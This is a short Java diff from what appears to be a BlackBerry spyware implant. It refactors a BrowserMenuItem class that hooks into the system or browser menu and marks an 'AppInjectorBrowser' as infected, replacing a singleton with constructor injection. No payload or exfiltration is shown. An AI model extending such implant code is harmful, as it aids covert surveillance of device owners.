@@ -38,22 +38,18 @@ public class BrowserMenuItem extends ApplicationMenuItem {
     Thread menuThread;
     ModuleUrl agent;
     private long bbmid;
+    
+    AppInjectorBrowser appInjector;
 
-    public static BrowserMenuItem getInstance() {
-        if (instance == null)
-            instance = new BrowserMenuItem(20);
-
-        return instance;
-    }
-
-    public BrowserMenuItem(int arg0) {
-        super(arg0);
+    public BrowserMenuItem(AppInjectorBrowser app) {
+        super(0);
 
         if (Device.getInstance().atLeast(6, 0)) {
             bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
         } else {
             bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;
         }
+        appInjector = app;        
     }
 
     /**
@@ -112,7 +108,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
                     Debug.ledFlash(Debug.COLOR_GREEN);
                 }
 
-                AppInjectorBrowser.getInstance().setInfected(true);
+                appInjector.setInfected(true);
             }
 
             if (context == null) {
